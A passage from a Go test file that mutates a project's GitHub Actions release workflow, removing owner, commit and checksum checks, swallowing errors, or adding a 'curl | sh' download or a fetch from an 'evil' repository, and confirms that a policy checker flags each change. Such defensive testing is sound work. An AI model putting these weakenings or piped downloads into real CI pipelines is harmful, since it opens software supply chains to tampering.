		{"smoke loses the mac runner", "            runner: macos-15", "            runner: ubuntu-24.04", "matrix", false},
		{"smoke floating runner", "            runner: ubuntu-24.04-arm", "            runner: ubuntu-latest", "matrix", false},
		{"publish loses smoke", "    needs: [verify, build, smoke]\n", "    needs: [verify, build]\n", "needs", false},
		{"publish loses build", "    needs: [verify, build, smoke]\n", "    needs: [verify, smoke]\n", "needs", false},
		{"publish loses verify", "    needs: [verify, build, smoke]\n", "    needs: [build, smoke]\n", "needs", false},
		{"smoke loses build", "    needs: [verify, build]\n", "    needs: [verify]\n", "needs", false},
		{"no environment", "    environment: release\n", "", "environment", false},
		{"other environment", "    environment: release\n", "    environment: staging\n", "environment", false},
		{"publish on dry runs", "    if: needs.verify.outputs.dry_run == 'false' && github.event_name == 'push' && github.ref_type == 'tag'\n", "", "publish-if", false},
		{"publish on dispatch", "needs.verify.outputs.dry_run == 'false' && github.event_name == 'push'", "needs.verify.outputs.dry_run == 'false'", "publish-if", false},
		{"ldflags removed", " -ldflags \"-X github.com/wstein/sheetmill/internal/cli.Version=$VERSION\" -o \"$RUNNER_TEMP/bin/smill\"", " -o \"$RUNNER_TEMP/bin/smill\"", "ldflags", false},
		{"trimpath removed", "go build -trimpath", "go build", "ldflags", true},
		{"cgo enabled", "CGO_ENABLED: '0'", "CGO_ENABLED: '1'", "build", false},
		{"toolchain download allowed", "GOTOOLCHAIN: local", "GOTOOLCHAIN: auto", "build", false},
		{"reproducibility check removed", "          cmp \"$RUNNER_TEMP/bin/smill\" \"$RUNNER_TEMP/bin/smill-second\"\n", "", "reproducibility", false},
		{"extra upload", "      - name: Smoke-test the shipped archive natively", "      - uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2\n        with:\n          path: x\n      - name: Smoke-test the shipped archive natively", "artifact", false},
		{"verify-tag removed", " --verify-tag", "", "publish", false},
		{"draft by default", `if [ "$DRAFT" = true ]; then flags+=(--draft); fi`, `flags+=(--draft)`, "draft", false},
		{"draft switch renamed", "vars.SHEETMILL_RELEASE_DRAFT", "vars.OTHER", "draft", false},
		{"tag race check removed", `test "$remote" = "$COMMIT"`, "true", "publish", false},
		{"checksum check removed", "          sha256sum --check SHA256SUMS\n", "", "publish", false},
		{"asset count check removed", `          test "$(ls -1 -- *.tar.gz | wc -l)" -eq 3` + "\n", "", "publish", false},
		{"secret used", "GH_TOKEN: ${{ github.token }}\n          REPO: ${{ github.repository }}\n          TAG: ${{ needs.verify.outputs.version }}", "GH_TOKEN: ${{ secrets.RELEASE_PAT }}\n          REPO: ${{ github.repository }}\n          TAG: ${{ needs.verify.outputs.version }}", "secrets", false},
		{"expression in a script", `sh .github/scripts/release-verify.sh version "$REF_NAME"`, `sh .github/scripts/release-verify.sh version "${{ github.ref_name }}"`, "injection", false},
		{"tool download", "      - run: make test-assets\n", "      - run: make test-assets\n      - run: curl -sSL https://example.test/x | sh\n", "download", false},
		{"pusher check removed", `test "$ACTOR" = "$OWNER" || { echo "run started`, `true || { echo "run started`, "verify", false},
		{"owner env always true", "ACTOR: ${{ github.triggering_actor }}\n          PUSHER: ${{ github.actor }}\n          OWNER: ${{ github.repository_owner }}\n        run: |\n          set -euo pipefail\n          # A re-run", "ACTOR: ${{ github.repository_owner }}\n          PUSHER: ${{ github.actor }}\n          OWNER: ${{ github.repository_owner }}\n        run: |\n          set -euo pipefail\n          # A re-run", "publish", false},
		{"verify owner env always true", "ACTOR: ${{ github.triggering_actor }}\n          PUSHER: ${{ github.actor }}\n          OWNER: ${{ github.repository_owner }}\n        run: |\n          set -euo pipefail\n          test", "ACTOR: ${{ github.repository_owner }}\n          PUSHER: ${{ github.actor }}\n          OWNER: ${{ github.repository_owner }}\n        run: |\n          set -euo pipefail\n          test", "verify", false},
		{"exit 1 became exit 0", `run started by $ACTOR, not by the repository owner $OWNER" >&2; exit 1; }`, `run started by $ACTOR, not by the repository owner $OWNER" >&2; exit 0; }`, "swallow", false},
		{"set +e", "          # The tag must still name", "          set +e\n          # The tag must still name", "swallow", false},
		{"echo instead of failing", `test "$n" -ge 1 || { echo`, `test "$n" -ge 1 || echo "x"; { echo`, "swallow", false},
		{"release-exists accepts any error", `*) echo "cannot tell whether a release exists: $out" >&2; exit 1 ;;`, `*) echo "cannot tell" ;;`, "verify", false},
		{"head check removed", `          test "$(git rev-parse HEAD)" = "$COMMIT"` + "\n", "", "publish", false},
		{"publish checks out main", "      - uses: actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09 # v5\n        with:\n          fetch-depth: 0\n          persist-credentials: false\n      - uses: actions/download-artifact", "      - uses: actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09 # v5\n        with:\n          ref: main\n          fetch-depth: 0\n          persist-credentials: false\n      - uses: actions/download-artifact", "publish", false},
		{"owner check reassigned (F1)", "          test \"$ACTOR\" = \"$OWNER\" || { echo \"run started", "          ACTOR=$OWNER\n          test \"$ACTOR\" = \"$OWNER\" || { echo \"run started", "assign", false},
		{"publish owner check reassigned (F1)", "          test \"$ACTOR\" = \"$OWNER\" || { echo \"run triggered", "          OWNER=$ACTOR\n          test \"$ACTOR\" = \"$OWNER\" || { echo \"run triggered", "assign", false},
		{"original pusher check removed (F11)", "\n          test \"$PUSHER\" = \"$OWNER\" || { echo \"run originally started by $PUSHER, not by the repository owner $OWNER\" >&2; exit 1; }\n      - name: Require an annotated tag", "\n      - name: Require an annotated tag", "semantic", false},
		{"check-run count overwritten (F2)", `          test "$n" -ge 1 ||`, "          n=1\n          test \"$n\" -ge 1 ||", "assign", false},
		{"env on a gate step (F2)", "      - run: make check\n", "      - env:\n          GOFLAGS: -run=^$\n        run: make check\n", "env", false},
		{"env on the verify job (F2)", "    timeout-minutes: 15\n    permissions:\n      contents: read\n      actions: read\n", "    timeout-minutes: 15\n    env:\n      GOFLAGS: -run=^$\n    permissions:\n      contents: read\n      actions: read\n", "env", false},
		{"build checkout from main (F3)", "      - uses: actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09 # v5\n        with:\n          persist-credentials: false\n      - uses: actions/setup-go@924ae3a1cded613372ab5595356fb5720e22ba16 # v6\n        with:\n          go-version-file: .go-version\n          check-latest: false\n          cache: false", "      - uses: actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09 # v5\n        with:\n          ref: main\n          persist-credentials: false\n      - uses: actions/setup-go@924ae3a1cded613372ab5595356fb5720e22ba16 # v6\n        with:\n          go-version-file: .go-version\n          check-latest: false\n          cache: false", "with", false},
		{"smoke downloads from another run (F3)", "          name: release-${{ matrix.os }}-${{ matrix.arch }}\n          path: ${{ runner.temp }}/dist\n      - name: Smoke", "          name: release-${{ matrix.os }}-${{ matrix.arch }}\n          run-id: 1\n          github-token: ${{ github.token }}\n          path: ${{ runner.temp }}/dist\n      - name: Smoke", "with", false},
		{"build commit check removed (F3)", "          test \"$(git rev-parse HEAD)\" = \"$COMMIT\" || { echo \"checkout is not the verified commit $COMMIT\" >&2; exit 1; }\n          mkdir", "          mkdir", "build", false},
		{"smoke commit check removed (F3)", "          test \"$(git rev-parse HEAD)\" = \"$COMMIT\" || { echo \"checkout is not the verified commit $COMMIT\" >&2; exit 1; }\n          plain", "          plain", "smoke", false},
		{"setup-go may float (F5)", "          go-version-file: .go-version\n          check-latest: false\n      - name: Resolve", "          go-version-file: .go-version\n          check-latest: true\n      - name: Resolve", "with", false},
		{"command between builds (F6)", "          cmp \"$RUNNER_TEMP/bin/smill\" \"$RUNNER_TEMP/bin/smill-second\"", "          cp \"$RUNNER_TEMP/bin/smill\" \"$RUNNER_TEMP/bin/smill-second\"\n          cmp \"$RUNNER_TEMP/bin/smill\" \"$RUNNER_TEMP/bin/smill-second\"", "reproducibility", false},
		{"second build shares the cache (F6)", `GOCACHE="$RUNNER_TEMP/gocache-second" go build`, `go build`, "semantic", false},
		{"checksum list unsorted (F9)", "LC_ALL=C sort -k2 > SHA256SUMS", "cat > SHA256SUMS", "semantic", false},
		{"main fetch from another repo", `git fetch --force --no-tags "https://github.com/$REPO" '+refs/heads/main`, `git fetch --force --no-tags "https://github.com/evil/sheetmill" '+refs/heads/main`, "url", false},
		{"commit output from the branch", `echo "commit=$GITHUB_SHA"`, `echo "commit=$(git rev-parse origin/main)"`, "semantic", false},
		{"asset count check removed (F1)", `          test "$(wc -l < SHA256SUMS)" -eq 3` + "\n", "", "semantic", false},
		{"smoke commit reassigned (F1)", "          test \"$(git rev-parse HEAD)\" = \"$COMMIT\" || { echo \"checkout is not the verified commit $COMMIT\" >&2; exit 1; }\n          plain", "          COMMIT=$(git rev-parse HEAD)\n          test \"$(git rev-parse HEAD)\" = \"$COMMIT\" || { echo \"checkout is not the verified commit $COMMIT\" >&2; exit 1; }\n          plain", "assign", false},
		{"eval in a script", "          mkdir -p \"$RUNNER_TEMP/bin\"", "          eval \"true\"\n          mkdir -p \"$RUNNER_TEMP/bin\"", "assign", false},
		{"unknown with key", "          path: ${{ runner.temp }}/dist/*\n", "          path: ${{ runner.temp }}/dist/*\n          overwrite: true\n", "with", false},
		{"pusher check swallowed", "exit 1; }\n      - name: Require an annotated tag", "exit 1; } || true\n      - name: Require an annotated tag", "swallow", false},
		{"owner check made conditional", "      - name: Require the repository owner to have started the run\n", "      - name: Require the repository owner to have started the run\n        if: steps.resolve.outputs.dry_run == 'false'\n", "verify", false},
		{"smoke step conditional", "      - name: Smoke-test the shipped archive natively\n", "      - name: Smoke-test the shipped archive natively\n        if: github.event_name == 'none'\n", "step-if", false},
		{"cmp compares a file with itself", `cmp "$RUNNER_TEMP/bin/smill" "$RUNNER_TEMP/bin/smill-second"`, `cmp "$RUNNER_TEMP/bin/smill" "$RUNNER_TEMP/bin/smill"`, "reproducibility", false},
		{"check-run count weakened", `test "$n" -ge 1`, `test "$n" -ge 0`, "verify", false},
		{"ancestry against HEAD", `release-verify.sh tag "$TAG" refs/remotes/origin/main`, `release-verify.sh tag "$TAG" HEAD`, "verify", false},
		{"main refspec wrong", `'+refs/heads/main:refs/remotes/origin/main'`, `'+refs/tags/main:refs/remotes/origin/main'`, "verify", false},
		{"checksum check swallowed", "          sha256sum --check SHA256SUMS\n", "          sha256sum --check SHA256SUMS || true\n", "swallow", false},
		{"tag race overwritten", `test "$remote" = "$COMMIT" ||`, `remote=$COMMIT; test "$remote" = "$COMMIT" ||`, "publish", false},
		{"publish not strict", "          set -euo pipefail\n          # A re-run by someone else", "          # A re-run by someone else", "strict", false},
		{"smoke runs true", `sh .github/scripts/release-smoke.sh `, `true `, "archive", false},
		{"smoke downloads another target", "          name: release-${{ matrix.os }}-${{ matrix.arch }}\n          path: ${{ runner.temp }}/dist\n      - name: Smoke", "          name: release-linux-amd64\n          path: ${{ runner.temp }}/dist\n      - name: Smoke", "artifact", false},
		{"annotated check removed", "release-verify.sh tag", "release-verify.sh version", "verify", false},
		{"check run query removed", "head_sha=$GITHUB_SHA", "head_sha=0", "verify", false},
		{"404 handling removed", "*\"HTTP 404\"*)", "*)", "verify", false},
		{"tag step unguarded", "      - name: Require an annotated tag on a commit of main\n        if: steps.resolve.outputs.dry_run == 'false'\n", "      - name: Require an annotated tag on a commit of main\n", "verify", false},
		{"verify shallow", "          fetch-depth: 0\n          persist-credentials: false\n      - uses: actions/setup-go@924ae3a1cded613372ab5595356fb5720e22ba16 # v6\n        with:\n          go-version-file: .go-version\n          check-latest: false\n      - name: Resolve", "          persist-credentials: false\n      - uses: actions/setup-go@924ae3a1cded613372ab5595356fb5720e22ba16 # v6\n        with:\n          go-version-file: .go-version\n          check-latest: false\n      - name: Resolve", "verify", false},
		{"no timeout", "    timeout-minutes: 15\n    permissions:\n      contents: write", "    permissions:\n      contents: write", "timeout", false},
		{"cancel in progress", "cancel-in-progress: false", "cancel-in-progress: true", "concurrency", false},
		{"wrong archive name", `smill_${plain}_${OS}_${ARCH}.tar.gz`, `smill_${VERSION}_${OS}_${ARCH}.tar.gz`, "archive", false},
		{"upload name", "name: release-${{ matrix.os }}-${{ matrix.arch }}\n          path: ${{ runner.temp }}/dist/*", "name: release\n          path: ${{ runner.temp }}/dist/*", "artifact", false},
		{"publish downloads everything", "pattern: release-*", "pattern: '*'", "publish", false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			n := 1
			if c.all {
				n = -1
			}
			if !strings.Contains(raw, c.old) {
				t.Fatalf("HARNESS ERROR, NOT A KILL: mutation %q targets text no longer in release.yml: %q", c.name, c.old)
			}
			mutated := strings.Replace(raw, c.old, c.new, n)
			var w workflow
			if err := yaml.Unmarshal([]byte(mutated), &w); err != nil {
				t.Fatalf("mutation does not parse: %v", err)
			}
			if c.code == "golden" {
				// A change detector, not a semantic rule: the case documents what it flags.
				if goldenDiff(mutated) == "" {
					t.Errorf("the golden file did not flag %q", c.name)
				}
				return
			}
			got := violations(w, mutated)
			for _, line := range got {
				if strings.HasPrefix(line, c.code+":") {
					return
				}
			}
			t.Errorf("weakening %q was not reported as %q; got %v", c.name, c.code, got)
		})
	}
}

// The compile-only matrix in check.yml and the release matrix must name the same targets.
func TestCheckAndReleaseBuildTheSameTargets(t *testing.T) {
	release := parse(t, readFile(t, ".github/workflows/release.yml"))
	check := parse(t, readFile(t, ".github/workflows/check.yml"))
	if got, want := targets(check.Jobs["build"]), targets(release.Jobs["build"]); !reflect.DeepEqual(got, want) {
		t.Fatalf("check.yml builds %v but release.yml builds %v", got, want)
	}
	if !reflect.DeepEqual(targets(release.Jobs["smoke"]), targets(release.Jobs["build"])) {
		t.Fatal("smoke does not cover the build targets")
	}
	// check.yml must stay verification-only: no release permission, no upload.
	if !reflect.DeepEqual(check.Permissions, map[string]string{"contents": "read"}) {
		t.Errorf("check.yml permissions changed: %v", check.Permissions)
	}
	for name, j := range check.Jobs {
		for _, s := range j.Steps {
			if strings.HasPrefix(s.Uses, "actions/upload-artifact") || strings.Contains(s.Run, "gh release") {
				t.Errorf("check.yml job %s publishes", name)
			}
		}
	}
	raw := readFile(t, ".github/workflows/check.yml")
	if !strings.Contains(strings.SplitN(raw, "\njobs:", 2)[0], "release.yml") {
		t.Error("check.yml header must point at release.yml")
	}
}
